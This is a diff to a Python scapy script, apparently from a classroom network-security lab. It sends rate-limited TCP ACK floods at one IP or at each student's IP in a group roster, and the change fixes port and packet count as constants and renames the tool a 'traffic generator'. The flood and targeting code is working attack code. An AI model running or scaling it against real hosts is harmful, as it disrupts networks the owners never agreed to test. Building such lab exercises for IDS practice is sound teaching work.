@@ -5,6 +5,12 @@ import time
 import os
 import sys
 
+# ===== LAB CONSTANTS (DO NOT CHANGE IN CLASS) =====
+DEST_PORT = 5555
+PACKET_COUNT = 200        # good IDS-friendly default
+SLEEP_TIME = 0.01
+# =================================================
+
 # Import scapy only when available
 try:
     from scapy.all import IP, TCP, send
@@ -18,21 +24,21 @@ def load_roster(path):
         return json.load(f)
 
 
-def ack_flood(dest_ip, dest_port, packet_count=100):
+def ack_flood(dest_ip):
     """Send a burst of TCP ACK packets to the specified target."""
     if IP is None:
         print("Scapy is required to send packets.")
         return
 
     print("Starting ACK flood to {}:{} ({} packets)".format(
-        dest_ip, dest_port, packet_count))
+        dest_ip, DEST_PORT, PACKET_COUNT))
 
-    for i in range(packet_count):
+    for i in range(PACKET_COUNT):
         src_port = random.randint(1024, 65535)
 
         pkt = IP(dst=dest_ip) / TCP(
             sport=src_port,
-            dport=dest_port,
+            dport=DEST_PORT,
             flags="A"
         )
 
@@ -41,26 +47,26 @@ def ack_flood(dest_ip, dest_port, packet_count=100):
         if (i + 1) % 50 == 0:
             print("  Sent {} packets".format(i + 1))
 
-        time.sleep(0.01)
+        time.sleep(SLEEP_TIME)
 
     print("Finished sending to {}".format(dest_ip))
 
 
-def attack_group(group_name, roster, port, count):
+def attack_group(group_name, roster):
     if group_name not in roster:
         print("Group not found:", group_name)
         return
 
     group = roster[group_name]
 
-    for student, ip in group.items():   # ✅ FIXED (colon added)
+    for student, ip in group.items():
         print("Attacking {} -> {}".format(student, ip))
-        ack_flood(ip, port, packet_count=count)
+        ack_flood(ip)
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="ACK flood launcher (lab use only)"
+        description="ACK traffic generator (lab use only)"
     )
 
     parser.add_argument(
@@ -71,8 +77,6 @@ def main():
 
     parser.add_argument("--target-group", help="Group name (e.g., group1)")
     parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
-    parser.add_argument("--port", type=int, default=5555)
-    parser.add_argument("--count", type=int, default=1000)
 
     args = parser.parse_args()
 
@@ -91,15 +95,10 @@ def main():
         roster = load_roster(args.roster)
 
     if args.target_ip:
-        ack_flood(args.target_ip, args.port, packet_count=args.count)
+        ack_flood(args.target_ip)
 
     if args.target_group:
-        attack_group(
-            args.target_group,
-            roster,
-            port=args.port,
-            count=args.count
-        )
+        attack_group(args.target_group, roster)
 
     if not args.target_ip and not args.target_group:
         print("Use --target-group <name> or --target-ip <ip>")
